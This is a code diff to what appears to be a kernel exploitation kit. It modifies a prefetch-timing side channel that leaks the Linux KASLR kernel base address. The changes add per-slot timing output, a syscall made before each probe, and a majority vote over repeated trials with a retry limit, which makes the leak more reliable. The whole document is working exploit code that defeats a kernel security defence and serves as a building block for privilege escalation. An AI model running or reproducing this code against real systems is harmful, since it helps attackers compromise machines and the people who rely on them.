@@ -20,6 +20,10 @@
 #include <optional>
 #include <xdk/util/error.h>
 #include <xdk/util/pwn_utils.h>
+#include <stdio.h>
+#include <iostream>
+#include <sys/syscall.h>
+#include <unistd.h>
 
 bool is_kaslr_base(uint64_t kbase_addr) {
     if ((kbase_addr & 0xFFFF0000000FFFFF) != 0xFFFF000000000000)
@@ -56,6 +60,8 @@ const uint64_t KASLR_END = KASLR_START + 0x40000000;
 // The KASLR slot size; equal to CONFIG_PHYSICAL_ALIGN
 const uint64_t KASLR_SLOT_SIZE = 0x200000;
 
+const int KASLR_MAX_ATTEMPTS = 100;
+
 uint64_t compute_median(std::vector<uint64_t> v) {
     assert(!v.empty() && "compute_median received an empty vector");
     size_t n = v.size() / 2;
@@ -67,6 +73,8 @@ uint64_t abs_diff(uint64_t a, uint64_t b) {
     return (a > b) ? (a - b) : (b - a);
 }
 
+uint64_t slot_to_addr(size_t slot);
+
 std::optional<uint64_t> try_find_edge(const std::vector<uint64_t>& timings) {
     uint64_t median = compute_median(timings);
     uint64_t max_diff = 0;
@@ -77,6 +85,12 @@ std::optional<uint64_t> try_find_edge(const std::vector<uint64_t>& timings) {
         }
     }
     uint64_t threshold = max_diff / 2;
+
+    std::cout << "median: " << median << " threshold: " << threshold << std::endl;
+    for (size_t slot = 0; slot < timings.size(); slot++) {
+        printf("%lx: %lu \n", slot_to_addr(slot), timings[slot]);
+    }
+
     for (size_t slot = 0; slot < timings.size(); slot++) {
         uint64_t diff = abs_diff(timings[slot], median);
         if (diff >= threshold) {
@@ -130,10 +144,10 @@ inline __attribute__((always_inline)) void prefetch(uint64_t addr) {
         : "r" (addr));
 }
 
-size_t sidechannel(uint64_t addr) {
-    size_t time = rdtsc_begin();
+uint64_t sidechannel(uint64_t addr) {
+    uint64_t time = rdtsc_begin();
     prefetch(addr);
-    size_t delta = rdtsc_end() - time;
+    uint64_t delta = rdtsc_end() - time;
     return delta;
 }
 
@@ -144,6 +158,7 @@ std::optional<uint64_t> try_leak_kaslr_base(int samples) {
     for (int i = 0; i < samples; i++) {
         for (size_t slot = 0; slot < slots; slot++) {
             uint64_t addr = slot_to_addr(slot);
+            syscall(104);
             uint64_t timing = sidechannel(addr);
             if (timing < timings[slot]) {
                 timings[slot] = timing;
@@ -158,10 +173,48 @@ std::optional<uint64_t> try_leak_kaslr_base(int samples) {
     return std::nullopt;
 }
 
-uint64_t leak_kaslr_base(int samples) {
-    std::optional<uint64_t> base = try_leak_kaslr_base(samples);
-    if (!base.has_value()) {
-        throw ExpKitError("Failed to leak KASLR base");
+std::optional<uint64_t> find_majority(const std::vector<std::optional<uint64_t>>& slots) {
+    uint64_t candidate = 0;
+    size_t count = 0;
+
+    for (const auto& slot : slots) {
+        if (count == 0) {
+            if (slot.has_value()) {
+                candidate = slot.value();
+                count = 1;
+            }
+        } else {
+            if (slot.has_value() && slot.value() == candidate) {
+                count++;
+            } else {
+                count--;
+            }
+        }
     }
-    return *base;
+
+    size_t actual_count = 0;
+    for (const auto& slot : slots) {
+        if (slot.has_value() && slot.value() == candidate) {
+            actual_count++;
+        }
+    }
+
+    if (actual_count > slots.size() / 2) {
+        return candidate;
+    }
+    return std::nullopt;
+}
+
+uint64_t leak_kaslr_base(int samples, int trials) {
+    std::vector<std::optional<uint64_t>> slots(trials);
+    for (int attempt = 0; attempt < KASLR_MAX_ATTEMPTS; attempt++) {
+        for (int trial = 0; trial < trials; trial++) {
+            slots[trial] = try_leak_kaslr_base(samples);
+        }
+        std::optional<uint64_t> slot = find_majority(slots);
+        if (slot.has_value()) {
+            return *slot;
+        }
+    }
+    throw ExpKitError("Failed to leak KASLR base");
 }
